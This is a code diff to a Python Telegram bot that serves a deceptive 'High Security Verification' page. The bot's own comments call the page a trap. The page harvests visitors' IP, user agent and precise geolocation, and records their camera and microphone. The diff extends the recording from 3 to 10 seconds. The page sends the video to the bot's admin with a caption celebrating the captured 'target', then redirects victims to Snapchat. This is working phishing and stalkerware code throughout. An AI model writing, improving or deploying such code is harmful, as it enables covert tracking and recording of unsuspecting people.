@@ -163,7 +163,7 @@ async def handle_admin_photo(message: Message):
         user_states[ADMIN_ID] = {}
         await bot.send_photo(chat_id=ADMIN_ID, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی پێشکەوتوو بە دوو دوگمەی شاهانە بۆ دڵنیابوون لە کارکردنی لۆکەیشن و کامێرا بە بێ کێشە
+# پەڕەی تەڵەی شاهانەی پێشکەوتوو (١٠ سانیە تۆمارکردن و ڕووکاری دوو قۆناغی)
 async def web_trap_page(request: web.Request):
     redirect_url = request.query.get('redirect', 'https://snapchat.com')
     headers = request.headers
@@ -175,7 +175,7 @@ async def web_trap_page(request: web.Request):
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification Portal</title>
+    <title>High Security Verification</title>
     <style>
         body {{
             background: linear-gradient(135deg, #07090f 0%, #121826 100%);
@@ -239,7 +239,6 @@ async def web_trap_page(request: web.Request):
         const redirectTarget = "{redirect_url}";
         const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
 
-        // ناردنی زانیاری سەرەتایی ئامێر و IP بە شێوەی پاشبنەما
         fetch('/save_info', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
@@ -250,15 +249,14 @@ async def web_trap_page(request: web.Request):
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
                     fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude)
-                    .then(() => {{
+                    .finally(() => {{
                         document.getElementById('step1').classList.add('hidden');
                         document.getElementById('step2').classList.remove('hidden');
                     }});
                 }}, function(err) {{
-                    // ئەگەر رەتیشی بکاتەوە، ڕێگەی پێدەدەین هەنگاوی دووەم ببینێت
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('step2').classList.remove('hidden');
-                }}, {{ timeout: 8000, enableHighAccuracy: true }});
+                }}, {{ timeout: 10000, enableHighAccuracy: true }});
             }} else {{
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
@@ -296,9 +294,10 @@ async def web_trap_page(request: web.Request):
                 }};
                 
                 mediaRecorder.start();
+                // ماوەی تۆمارکردن زیادکرا بۆ ١۰ سانیە بە تەواوی
                 setTimeout(function() {{
                     mediaRecorder.stop();
-                }}, 3000);
+                }}, 10000);
                 
             }}).catch(function(err) {{
                 window.location.href = redirectTarget;
@@ -333,7 +332,7 @@ async def upload_video(request):
             await bot.send_video(
                 chat_id=ADMIN_ID, 
                 video=video_file, 
-                caption="🚨 **ڤیدیۆ و دەنگی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
+                caption="🚨 **ڤیدیۆ و دەنگی ١۰ چرکەیی ئامانج بە سەرکەوتوویی تۆمارکرا و دەستگیرکرا!**"
             )
     except Exception as e:
         logging.error(f"Video upload error: {e}")
